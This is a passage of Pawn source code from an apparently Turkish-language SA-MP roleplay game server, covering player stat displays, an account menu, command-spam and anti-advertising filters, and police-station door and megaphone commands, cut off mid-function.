					else if(skilllevel >= 401) { jlevel2 = 5; }
			}
			case 5:
			{
					new skilllevel = PlayerInfo[targetid][pCarSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel2 = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel2 = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel2 = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel2 = 4; }
					else if(skilllevel >= 401) { jlevel2 = 5; }
			}
	  		case 7:
			{
					new skilllevel = PlayerInfo[targetid][pMechSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel2 = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel2 = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel2 = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel2 = 4; }
					else if(skilllevel >= 401) { jlevel2 = 5; }
			}
			case 9:
			{
					new skilllevel = PlayerInfo[targetid][pArmsSkill];
					if(skilllevel >= 0 && skilllevel < 50) { jlevel2 = 1; }
					else if(skilllevel >= 50 && skilllevel < 100) { jlevel2 = 2; }
					else if(skilllevel >= 100 && skilllevel < 200) { jlevel2 = 3; }
					else if(skilllevel >= 200 && skilllevel < 400) { jlevel2 = 4; }
					else if(skilllevel >= 400) { jlevel2 = 5; }
			}
			case 12:
			{
					new skilllevel = PlayerInfo[targetid][pBoxSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel2 = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel2 = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel2 = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel2 = 4; }
					else if(skilllevel >= 401) { jlevel2 = 5; }
			}
			case 14:
			{
					new skilllevel = PlayerInfo[targetid][pSmugSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel2 = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel2 = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel2 = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel2 = 4; }
					else if(skilllevel >= 401) { jlevel2 = 5; }
			}
			case 20:
			{
					new skilllevel = PlayerInfo[targetid][pTruckSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel2 = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel2 = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel2 = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel2 = 4; }
					else if(skilllevel >= 401) { jlevel2 = 5; }
			}
			default: jlevel2 = 0;
		}

		new upgrade = PlayerInfo[targetid][gPupgrade];
		new Float:sarmor = PlayerInfo[targetid][pSarmor];

		new cash =  GetPlayerCash(targetid);
		new bank = PlayerInfo[targetid][pBank];
		new totalwealth = cash + bank;

		new insur[20];
		switch(PlayerInfo[targetid][pInsurance])
		{
			case 1: insur = "All Saints";
			case 2: insur = "County General";
			default: insur = "Yok";
		}

		new crimes = PlayerInfo[targetid][pCrimes];
		new arrests = PlayerInfo[targetid][pArrested];
		new wanted = PlayerInfo[targetid][pWantedLevel];
		new Float:health, Float:armor;
		GetPlayerHealth(targetid,health);
		GetPlayerArmour(targetid,armor);

		new pot = PlayerInfo[targetid][pPot];
		new crack = PlayerInfo[targetid][pCrack];
		new packages = GetPVarInt(targetid, "Paketler");
		new crates = PlayerInfo[targetid][pCrates];

		new mats = PlayerInfo[targetid][pMats];
		new rope = PlayerInfo[targetid][pRope];
		new cigars = PlayerInfo[targetid][pCigar];
		new sprunk = PlayerInfo[targetid][pSprunk];
		new spray = PlayerInfo[targetid][pSpraycan];
		new bigfish = PlayerInfo[targetid][pBiggestFish];

		new house = PlayerInfo[targetid][pHouse];
		new rent = PlayerInfo[targetid][pRenting];
		new interior = PlayerInfo[targetid][pInt];
		new vw = PlayerInfo[targetid][pVW];
		new realvw = GetPlayerVirtualWorld(targetid);
		new jtime = PlayerInfo[targetid][pJailTime];
//		new isyeri = PlayerInfo[targetid][pBiz];

		// Added
		new married[20];
		strmid(married, PlayerInfo[targetid][pMarriedTo], 0, strlen(PlayerInfo[targetid][pMarriedTo]), 255);
		new reftokens = PlayerInfo[targetid][pRefTokens];
		new sext[16];
		if(PlayerInfo[targetid][pSex] == 1) { sext = "Erkek"; } else { sext = "Bayan"; }
		new age = PlayerInfo[targetid][pAge];

		new donatortxt[16];
		if(PlayerInfo[targetid][pDonator] == 0) { donatortxt = "Hayýr"; }
		else if(PlayerInfo[targetid][pDonator] == 1) { donatortxt = "Yakut"; }
		else if(PlayerInfo[targetid][pDonator] == 2) { donatortxt = "Safir"; }
		else if(PlayerInfo[targetid][pDonator] == 3) { donatortxt = "Elmas"; }
		else { donatortxt = "Hayýr"; }

		new nmutes = PlayerInfo[targetid][pNMuteTotal];
        new admutes = PlayerInfo[targetid][pADMuteTotal];
        new rmutes = PlayerInfo[targetid][pRMutedTotal];
		new gate1 = PlayerInfo[targetid][pGate1];
		new gate2 = PlayerInfo[targetid][pGate2];
		new gate3 = PlayerInfo[targetid][pGate3];
		new gozbagi = PlayerInfo[targetid][pBlindfold];		
		new bidon = PlayerInfo[targetid][pGas];

		SendClientMessage(playerid, COLOR_RED,"___________________________________________________________________________________________________");
		SendClientMessage(playerid, COLOR_RED,"¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦");
		SendClientMessage(playerid, COLOR_RED,"___________________________________________________________________________________________________");
	    new coordsstring[128];
		if(pnumber == 0) format(coordsstring, sizeof(coordsstring),"%s - (Level: %d) - (Oynama Saati: %d) - (Cinsiyet: %s) - (Yaþ: %d) - (Telefon Numarasý: None) - (Uyarýlar: %d)", GetPlayerNameEx(targetid), level, phours, sext, age, warns);
		else format(coordsstring, sizeof(coordsstring),"%s - (Level: %d) - (Oynama Saati: %d) - (Cinsiyet: %s) - (Yaþ: %d) - (Telefon Numarasý: %d) - (Uyarýlar: %d)", GetPlayerNameEx(targetid), level, phours, sext, age, pnumber, warns);
		SendClientMessage(playerid, COLOR_WHITE, coordsstring);
		format(coordsstring, sizeof(coordsstring),"(%s: %s) - (Rütbe: %s [%d]) - (Birim: %s) - (Meslek: %s [lvl: %d]) - (Meslek 2: %s [lvl: %d])", facgang, employer, rank, PlayerInfo[targetid][pRank], division, jtext, jlevel, jtext2, jlevel2);
		SendClientMessage(playerid, 0x99FF33AA, coordsstring);
   		format(coordsstring, sizeof(coordsstring),"(Toplam Para: $%d) - (Nakit: $%d) - (Banka Hesabý: $%d) - (Sigorta: %s) - (Evli Oldugu Kisi: %s)", totalwealth, cash, bank, insur, married);
   		SendClientMessage(playerid, COLOR_WHITE, coordsstring);
		if(PlayerInfo[playerid][pAdmin] < 4 && playerid != targetid) {
			format(coordsstring, sizeof(coordsstring),"(Saygýnlýk: %d/%d [$%d]) - (Geliþim puaný: %d) - (Baþlangýç Zýrhý: %.1f) - (Can: %.1f) - (Zýrh: %.1f)", respect, expamount, costlevel, upgrade, sarmor, health, armor);
			SendClientMessage(playerid, 0x99FF33AA, coordsstring);
		} else {
			format(coordsstring, sizeof(coordsstring),"(Saygýnlýk: %d/%d [$%d]) - (Geliþim puaný: %d) - (Baþlangýç Zýrhý: %.1f) - (Can: %.1f) - (Zýrh: %.1f) - (Radyo: %d kHz)", respect, expamount, costlevel, upgrade, sarmor, health, armor, PlayerInfo[targetid][pRadioFreq]);
			SendClientMessage(playerid, 0x99FF33AA, coordsstring);
		}
   		format(coordsstring, sizeof(coordsstring),"(Suçlar: %d) - (Yakalanmalar: %d) - (Aranma Seviyesi: %d) - (Materyaller: %d) - (Pot: %d) - (Crack: %d) - (Paketler: %d) - (Kutular: %d)", crimes, arrests, wanted, mats, pot, crack, packages, crates);
   		SendClientMessage(playerid, COLOR_WHITE, coordsstring);
   		format(coordsstring, sizeof(coordsstring),"(Ip: %d) - (Sigara: %d) - (Gazoz: %d) - (Sprey: %d) - (Tohum: %d) -  (En büyük balýk: %d) - (Öneri Jetonu: %d) - (VIP: %s)", rope, cigars, sprunk, spray, PlayerInfo[targetid][pWSeeds], bigfish, reftokens, donatortxt);
        SendClientMessage(playerid, 0x99FF33AA, coordsstring);
		format(coordsstring, sizeof(coordsstring), "(Ev: %d) - (Kiralama: %d) - (Int: %d) - (VW: %d) - (Gerçek VW: %d) - (Hapis: %d saniye) - (Muteler: [N: %d] [AD: %d] [R: %d])", house, rent, interior, vw, realvw, jtime, nmutes, admutes, rmutes);
  		SendClientMessage(playerid, COLOR_WHITE,coordsstring);
		format(coordsstring, sizeof(coordsstring), "(Gate 1: %d) - (Gate 2: %d) - (Gate 3: %d) - (Göz Bandanasý: %d) - (Benzin Bidonu: %d)", gate1, gate2, gate3, gozbagi, bidon);
  		SendClientMessage(playerid, 0x99FF33AA,coordsstring);
		if(PlayerInfo[playerid][pAdmin] >= 1) {
	    	new tabbed[6];
		    if(playerTabbedTime[targetid] > 0) tabbed = "Evet";
		    else tabbed = "Hayýr";

		    new afk[6];
		    if(playerAFK[targetid] != 0 && playerAFKTime[targetid] > 0) afk = "Evet";
		    else afk = "Hayýr";

		    format(coordsstring, sizeof(coordsstring), "(Alt-tab: %s [%d saniye]) - (AFK: %s [%d saniye])", tabbed, playerTabbedTime[targetid], afk, playerAFKTime[targetid]);
		    SendClientMessage(playerid, COLOR_WHITE,coordsstring);
		}
		SendClientMessage(playerid, COLOR_RED,"___________________________________________________________________________________________________");
		SendClientMessage(playerid, COLOR_RED,"¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦");
		SendClientMessage(playerid, COLOR_RED,"___________________________________________________________________________________________________");
	}
}
#pragma tabsize 0
public OnPlayerClickTextDraw(playerid, Text:clickedid)
{
	new  fMatriz[1024];
	
	if (clickedid == CuentaGeneral){
 		if(gPlayerLogged[playerid] != 0)
	{
		ShowStats(playerid,playerid);
	}
	return 1;
	}
	 	if (clickedid == CuentaInmuebles)
	{
       new house2 = PlayerInfo[playerid][pHouse2];
		new house = PlayerInfo[playerid][pHouse];
		new rent = PlayerInfo[playerid][pRenting];
		new interior = PlayerInfo[playerid][pInt];
		new isyeri = PlayerInfo[playerid][pBiz];
	format(fMatriz,sizeof(fMatriz)," {FFFFFF}Ev:\t\t\t %d | %d\n Ev 2:\t\t %d\n Kiralama:\t\t\t %d\n Interior:\t\t %d\n Isyeri:\t\t %d",house,house2,rent, interior, isyeri);
	ShowPlayerDialogEx(playerid, KARAKTER, DIALOG_STYLE_MSGBOX, "{FFFFFF}Özellikler", fMatriz, "Ok", "");
	}
 if (clickedid == CuentaInventario)
	{
	new sprunk = PlayerInfo[playerid][pSprunk];
	new crack = PlayerInfo[playerid][pCrack];
	new crates = PlayerInfo[playerid][pCrates];
	new mats = PlayerInfo[playerid][pMats];
	new sprays = PlayerInfo[playerid][pSpraycan];
	new cash = GetPlayerCash(playerid);
	new bank = PlayerInfo[playerid][pBank];
	new totalwealth = cash + bank;
	new rope = PlayerInfo[playerid][pRope];
	new cigars = PlayerInfo[playerid][pCigar];
	new gozbagi = PlayerInfo[playerid][pBlindfold];
//devam edilceg baya
	format(fMatriz,sizeof(fMatriz)," {FFFFFF}%s\n Gazoz:\t\t %d\n Boya:\t\t %d\n Crack:\t\t %d\nPaketler:\t\t %d\n Material:\t\t %d\n Ip:\t\t %d\n Sigara:\t\t %d\n Gozbagi:\t\t %d\n Toplam para:\t\t %dTL\n",fMatriz, sprunk,sprays,crack,crates,mats,rope,cigars,gozbagi,totalwealth);
	ShowPlayerDialogEx(playerid, KARAKTER, DIALOG_STYLE_MSGBOX, "{FFFFFF}Envanter", fMatriz, "Ok", "");
	}
	if (clickedid == CuentaAutos)
	{
		new vstring[1024];
	for(new i, iModelID; i < MAX_PLAYERVEHICLES; i++) {
		if((iModelID = PlayerVehicleInfo[playerid][i][pvModelId] - 400) >= 0) {
			if(PlayerVehicleInfo[playerid][i][pvImpounded]) {
			format(vstring, sizeof(vstring), "%s\n%s (El konuldu)", vstring, VehicleName[iModelID]);
			}
			else if(PlayerVehicleInfo[playerid][i][pvDisabled]) {
				format(vstring, sizeof(vstring), "%s\n%s (Men edilmiþ)", vstring, VehicleName[iModelID]);
			}
			else if(PlayerVehicleInfo[playerid][i][pvSpawned] != 1) {
				format(vstring, sizeof(vstring), "%s\n%s (Depoda)", vstring, VehicleName[iModelID]);
			}
			else format(vstring, sizeof(vstring), "%s\n%s (Aktif)", vstring, VehicleName[iModelID]);
		}
		else strcat(vstring, "\nBoþ");
	}
	ShowPlayerDialogEx(playerid, VEHICLESTORAGE, DIALOG_STYLE_LIST, "Araç Garajý", vstring, "Çýkart", "Iptal");
 	return 1;
	}
	if (clickedid == CuentaCerrar)
	{
	OcultarCuenta(playerid);
	}
	return 1;
}


public OnPlayerCommandPerformed(playerid, cmdtext[], success)
{
	if(!success) SendClientMessage(playerid, COLOR_WHITE, "Bu komut mevcut deðil. Komut listesini görmek için /yardim yazýn.");
	return 1;
}

public OnPlayerCommandReceived(playerid, cmdtext[])
{
	playerLastTyped[playerid] = 0;
	printf("[cmd] [%s]: %s", GetPlayerNameEx(playerid), cmdtext);

	if(gPlayerLogged[playerid] != 1)
	{
		SendClientMessage(playerid, COLOR_RED, "Giriþ yapmadýnýz.");
		return 0;
	}

	if(GetPVarInt(playerid, "LoadingObjects") == 1) {
	    SendClientMessage(playerid, COLOR_GRAD2, "Bunu þu an yapamazsýnýz.");
	    return 0;
	}

	if(PlayerInfo[playerid][pTut] == 0)
		return 1;

	if(CommandSpamUnmute[playerid] != 0) {
		if(PlayerInfo[playerid][pAdmin] < 6) {
			SendClientMessage(playerid, COLOR_WHITE, "Þu an komut giriþi için mutelisiniz.");
			return 0;
		}
	}

	if(PlayerInfo[playerid][pAdmin] < 6) {
		CommandSpamTimes[playerid]++;

		if(CommandSpamTimes[playerid] == 5)
		{
			CommandSpamTimes[playerid] = 0;
			CommandSpamUnmute[playerid] = 10;
			SendClientMessage(playerid, COLOR_YELLOW, "Spam yaptýðýnýz için otomatik olarak mutelendiniz. 10 saniye bekleyip tekrar deneyiniz.");
			SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_FLOODPROTECTION);
			return 0;
		}
	}

	if(strfind(cmdtext, "|", true) != -1)
	{
	    SendClientMessage(playerid, COLOR_RED, "Komutlarda '|' karakterini kullanamazsýnýz.");
		return 0;
	}

	if(PlayerInfo[playerid][pAdmin] < 4)
	{
		if(strfind(cmdtext, ":", true) != -1)
		{

			new
				i_numcount,
				i_period,
				i_pos;

			while(cmdtext[i_pos]) {
				if('0' <= cmdtext[i_pos] <= '9') i_numcount++;
				else if(cmdtext[i_pos] == '.') i_period++;
				i_pos++;
			}
			if(i_numcount >= 8 && i_period >= 3) {
				new string[128];
				format(string,sizeof(string),"Uyarý: %s kiþisi server reklamý yapýyor olabilir: '%s'.", GetPlayerNameEx(playerid),cmdtext);
				ABroadCast(COLOR_RED, string, 2);
				Log("logs/hack.log", string);
				return 0;
			}
		}
	}
	return 1;
}
CMD:hm(playerid, params[])
{
        if(IsACop(playerid)) {
        ShowPlayerDialogEx(playerid, DIALOGMEGAFON, DIALOG_STYLE_LIST, "Megafon Menu", "Teslim ol etrafýn sarýldý!\nOrada olduðunu biliyoruz.\nHey sen! Polis. Dur!\nL.S.P.D! Olduðun yerde kal!\nOlduðun yerde kal. Yoksa ateþ açacaðýz!\nHadi! Hadi! Hadi!\nPolis! Kýpýrdama!\nEllerin baþýnýn üstünde kalacak þekilde araçtan in!\nL.S.P.D Kenara çek... sen delimisin? Hepimizi öldürüyordun!", "Seç", "Iptal");
        } else SendClientMessage(playerid, COLOR_GRAD2, "Devlet memuru deðilsin!");
        return 1;
}
CMD:memurcagir(playerid, params[])
{
    if(PlayerInfo[playerid][pJob] != 2 && PlayerInfo[playerid][pJob2] != 2)
    {
        SendClientMessage(playerid, COLOR_GREY, "{FFFFFF}[{FF0000}@{FFFFFF}] Avukat deðilsin!");
        return 1;
    }
    if(!IsPlayerInRangeOfPoint(playerid, 2.2 ,246.2888,118.5326,1003.2188)) return SendClientMessage(playerid, COLOR_GREY, "Polis Departmaný lobisinde deðilsin!");

    new string[128];
    SendClientMessage(playerid, COLOR_WHITE, "Avukat olarak bir memur çaðýrdýnýz lütfen bekleyin.");
    format(string,sizeof(string),"Lobi: %s adlý Avukat lobide bir memur bekliyor.",GetPlayerNameEx(playerid));
   	SendFamilyMessage(1, COLOR_DBLUE, string);
	return 1;
}

CMD:pd(playerid, params[])
{
	new string[128];
    if(!IsPlayerConnected(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Komutlarý kullanmak için önce giriþ yapmanýz gerekmektedir.");
	if(PlayerInfo[playerid][pFaction] != 1) return SendClientMessage(playerid, COLOR_GREY, "Devlet memuru deðilsin.");
 	if(IsPlayerInRangeOfPoint(playerid, 3, 253.22212219238, 107.54524230957, 1003.5809326172) || IsPlayerInRangeOfPoint(playerid, 3, 253.22547912598, 110.60842132568, 1003.5809326172))
	{
    if(!LSPDLobbyStatus) // LSPD LOBBY
	    {
	        MoveDynamicObject(LSPDLobby[0], 253.22212219238, 107.54524230957, 1003.5809326172, 2);
	    	MoveDynamicObject(LSPDLobby[1], 253.22547912598, 110.60842132568, 1003.5809326172, 2);
	    	format(string, sizeof(string), "* %s parmaðýný tarayýcýya dokundurur ve kapý açýlýr.", RPN(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	        LSPDLobbyStatus = 1;
         	SetTimer("LSPDLobbyTimer", 3000, false);
			return 1;
	    }
	    else if(LSPDLobbyStatus)
	    {
	    	MoveDynamicObject(LSPDLobby[0], 253.18507385,108.53353882,1003.58093262, 2);
	    	MoveDynamicObject(LSPDLobby[1], 253.16732788,109.68534088,1003.58093262, 2);
			format(string, sizeof(string), "* %s %s parmaðýný tarayýcýya dokundurur ve kapý kapanýr.", RPN(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			LSPDLobbyStatus = 0;
			return 1;
	    }
	}


	if(IsPlayerInRangeOfPoint(playerid, 3, 239.63652038574, 118.1950302124, 1003.5809326172) || IsPlayerInRangeOfPoint(playerid, 3, 239.63296508789, 117.00688171387, 1003.5809326172))
	{
	    if(!LSPDLobbyStatus2) // LSPD LOBBYTimer2
	    {
	        MoveDynamicObject(LSPDLobby[2], 239.66482543945, 119.06954956055, 1003.5809326172, 2);
	    	MoveDynamicObject(LSPDLobby[3], 239.63677978516, 116.1040802002, 1003.5809326172, 2);
	    	format(string, sizeof(string), "* %s parmaðýný tarayýcýya dokundurur ve kapý açýlýr.", RPN(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	        LSPDLobbyStatus2 = 1;
         	SetTimer("LSPDLobbyTimer2", 3000, false);
         	return 1;
	    }
	    else if(LSPDLobbyStatus2)
	    {
	    	MoveDynamicObject(LSPDLobby[2], 239.63652038574, 118.1950302124, 1003.5809326172, 2);
	    	MoveDynamicObject(LSPDLobby[3], 239.63296508789, 117.00688171387, 1003.5809326172, 2);
			format(string, sizeof(string), "* %s %s parmaðýný tarayýcýya dokundurur ve kapý kapanýr.", RPN(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			LSPDLobbyStatus2 = 0;
			return 1;
	    }
	}

    if(IsPlayerInRangeOfPoint(playerid, 3, 264.32269287109, 112.54183959961, 1003.6422119141) || IsPlayerInRangeOfPoint(playerid, 3, 267.33877563477, 112.54633331299, 1003.6422119141))
	{
	    if(!LSPDLobbyStatus3) // LSPD LOBBYTimer3
	    {
	        MoveDynamicObject(LSPDLobby[4], 263.51568603516, 112.57638549805, 1003.6422119141, 2);
	    	MoveDynamicObject(LSPDLobby[5], 268.16961669922, 112.59413146973, 1003.6422119141, 2);
	    	format(string, sizeof(string), "* %s parmaðýný tarayýcýya dokundurur ve kapý açýlýr.", RPN(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	        LSPDLobbyStatus3 = 1;
         	SetTimer("LSPDLobbyTimer3", 3000, false);
         	return 1;
	    }
	    else if(LSPDLobbyStatus3)
	    {
	    	MoveDynamicObject(LSPDLobby[4], 264.32269287109, 112.54183959961, 1003.6422119141, 2);
	    	MoveDynamicObject(LSPDLobby[5], 267.33877563477, 112.54633331299, 1003.6422119141, 2);
			format(string, sizeof(string), "* %s %s parmaðýný tarayýcýya dokundurur ve kapý kapanýr.", RPN(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			LSPDLobbyStatus3 = 0;
			return 1;
	    }
	}

	else if(IsPlayerInRangeOfPoint(playerid, 3, 259.105194,90.812126,1002.584350) || IsPlayerInRangeOfPoint(playerid, 3, 258.843353,90.840599,1002.584350))
	{
	    if(!LSPDCellsStatus) // LSPD CELLS
	    {
	        MoveDynamicObject(LSPDCells[0], 259.105194,91.844230,1002.584350, 1.50);
	    	MoveDynamicObject(LSPDCells[1], 258.843353,89.812141,1002.584350, 1.50);
	    	MoveDynamicObject(LSPDCells[2], 258.949157,92.435539,1002.528625, 1.50);
	    	MoveDynamicObject(LSPDCells[3], 258.949157,89.254486,1002.528625, 1.50);
	    	format(string, sizeof(string), "* %s parmaðýný tarayýcýya koyar ve demir parmaklýklarý açar.", RPN(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	        LSPDCellsStatus = 1;
         	SetTimer("LSPDCellsTimer", 3000, false);
         	return 1;
	    }
	    else if(LSPDCellsStatus)
	    {
	    	MoveDynamicObject(LSPDCells[0], 259.105194,90.812126,1002.584350, 1.50);
	    	MoveDynamicObject(LSPDCells[1], 258.843353,90.840599,1002.584350, 1.50);
	    	MoveDynamicObject(LSPDCells[2], 258.949157,91.412040,1002.528625, 1.50);
	    	MoveDynamicObject(LSPDCells[3], 258.949157,90.292076,1002.528625, 1.50);
			format(string, sizeof(string), "* %s parmaðýný tarayýcýya koyar ve demir parmaklýklarý kapatýr.", RPN(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			LSPDCellsStatus = 0;
			return 1;
	    }
	}
	else if(IsPlayerInRangeOfPoint(playerid, 0.7, 255.494674,85.290985,1002.445312)) // LSPD Cells Office Left
	{
	    if(!LSPDOfficeStatus[0])
	    {
	        LSPDOfficeStatus[0] = 1;
	        MoveDynamicObject(LSPDOffice[0], 255.494674,85.290985,1005.445312, 3, 0, 0, 0);
	    }
	    else if(LSPDOfficeStatus[0])
	    {
	        LSPDOfficeStatus[0] = 0;
	        MoveDynamicObject(LSPDOffice[0], 255.494674,85.290985,1002.445312, 3, 0, 0, 0);
	    }
	}
	else if(IsPlayerInRangeOfPoint(playerid, 0.7, 254.380661,85.286033,1002.445312)) // LSPD Cells Office Right
	{
		if(!LSPDOfficeStatus[1])
	    {
	        LSPDOfficeStatus[1] = 1;
	        MoveDynamicObject(LSPDOffice[1], 254.380661,85.286033,1005.445312, 3, 0, 0, 180);
	    }
	    else if(LSPDOfficeStatus[1])
	    {
	        LSPDOfficeStatus[1] = 0;
	        MoveDynamicObject(LSPDOffice[1], 254.380661,85.286033,1002.445312, 3, 0, 0, 180);
	    }
	}
	else if(IsPlayerInRangeOfPoint(playerid, 5, 230.55876160,119.57346344,1010.58093262))
	{
	    if(PlayerInfo[playerid][pLeader] != 1) return SendClientMessage(playerid, COLOR_GREY, "LSPD Þefi deðilsin.");
	    if(!LSPDChiefStatus) // Chief's Office
	    {
	       	MoveDynamicObject(LSPDChief[0], 229.68397522,119.56812286,1010.58093262, 1.50);
	    	MoveDynamicObject(LSPDChief[1], 229.76559448,119.58856201,1010.58093262, 1.50);
	    	format(string, sizeof(string), "* %s parmaðýný tarayýcýya koyar ve ofis kapýsýný açar.", RPN(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	        LSPDChiefStatus = 1;
	        return 1;
	    }
	    else if(LSPDChiefStatus)
	    {
	    	MoveDynamicObject(LSPDChief[0], 230.55876160,119.57346344,1010.58093262, 1.50);
	    	MoveDynamicObject(LSPDChief[1], 231.60127258,119.61708832,1010.58093262, 1.50);
			format(string, sizeof(string), "* %s parmaðýný tarayýcýya koyar ve ofis kapýsýný kapatýr.", RPN(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			LSPDChiefStatus = 0;
			return 1;
	    }
	}
	else
	{
	    return SendClientMessage(playerid, COLOR_GREY, "Açabileceðin bir kapýnýn yakýnýnda deðilsin.");
	}
	return 1;
}
/*
CMD:silahal(playerid, params[])
{
    for(new i = 1; i < MAX_YERDEKI_SILAH; i++)
    {
	 	if(PlayerInfo[playerid][pLevel] >= 2)
		{
	        if(YerdekiSilahlar[i][slModel])
	        {
	            if(PlayerToPoint(2.0,playerid,YerdekiSilahlar[i][slX],YerdekiSilahlar[i][slY],YerdekiSilahlar[i][slZ]) && GetPlayerInterior(playerid) == YerdekiSilahlar[i][slINT] && GetPlayerVirtualWorld(playerid) == YerdekiSilahlar[i][slVW])
				{
				    SilahKontrol[playerid][YerdekiSilahlar[i][slModel]] = true;
				    GivePlayerValidWeapon(playerid, YerdekiSilahlar[i][slModel], 60000);
					DestroyObject(YerdekiSilahlar[i][slObje]);
					YerdekiSilahlar[i][slModel] = 0;
	    			YerdekiSilahlar[i][slX] = 0;
					YerdekiSilahlar[i][slY] = 0;
	    			YerdekiSilahlar[i][slZ] = 0;
	    			YerdekiSilahlar[i][slVW] = 0;
	    			YerdekiSilahlar[i][slINT] = 0;
					new Float:X,Float:Y,Float:Z;
					GetPlayerPos(playerid,X,Y,Z);
					EmoteMe(playerid,10.0,"yerde bulunan silahý alýr.");
					return 1;
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "Silahý alabilmek için en az 2 level olmalýsýnýz.");
			return 1;
		}
	}
	SendClientMessage(playerid, COLOR_WHITE, "Yakininizda silah bulunmuyor.");
	return 1;
}


CMD:silahbirak(playerid, params[])
{
    if(GetPlayerWeapon(playerid))
    {
	 	if(PlayerInfo[playerid][pLevel] >= 2)
		{
	    	for(new i = 1; i < MAX_YERDEKI_SILAH; i++)
	    	{
				if(!YerdekiSilahlar[i][slModel])
				{
				    new id = GetPlayerWeapon(playerid);
					new Float:X,Float:Y,Float:Z,VW,INT;
					GetPlayerPos(playerid,X,Y,Z);
					VW = GetPlayerVirtualWorld(playerid);
					INT = GetPlayerInterior(playerid);
					RemovePlayerWeapon(playerid, id);
					YerdekiSilahlar[i][slModel] = id;
					YerdekiSilahlar[i][slX] = X;
					YerdekiSilahlar[i][slY] = Y;
					YerdekiSilahlar[i][slZ] = Z;
					YerdekiSilahlar[i][slVW] = VW;
					YerdekiSilahlar[i][slINT] = INT;
					YerdekiSilahlar[i][slObje] = CreateObject(SilahObjeleri[id][0],X,Y,Z-0.98,93.7,120.0,120.0);
					EmoteMe(playerid,10.0,"elinde bulunan silahý yere birakýr.");
					SendClientMessage(playerid, COLOR_WHITE, "Elinizde bulunan silahý yere biraktýnýz.");
					return 1;
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "Yere silahýnýzý býrakabilmek için en az 2 level olmalýsýnýz.");
			return 1;
		}
	}
	else
	{
	    SendClientMessage(playerid, COLOR_WHITE, "Silahiniz bulunmuyor.");
	    return 1;
	}
	return 1;
}
*/
CMD:mobese(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2)
	{
		if(AdminDuty[playerid] == 1)
			return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");

		if(IsPlayerInRangeOfPoint(playerid,3.5,274.5474, 110.2418, 1004.6172))
		{
			SendClientMessage(playerid, COLOR_WHITE, "/mobese1 - Pershing Square");
			SendClientMessage(playerid, COLOR_WHITE, "/mobese2 - Las Colinas");
			SendClientMessage(playerid, COLOR_WHITE, "/mobese3 - Glen Park");
			SendClientMessage(playerid, COLOR_WHITE, "/mobese4 - Rodeo");
			SendClientMessage(playerid, COLOR_WHITE, "/mobese5 - All Saints");
			SendClientMessage(playerid, COLOR_WHITE, "/mobese6 - Country General");
			SendClientMessage(playerid, COLOR_WHITE, "/mobese7 - LSPD 1");
			SendClientMessage(playerid, COLOR_WHITE, "/mobese8 - LSPD 2");
		}
		else
		{
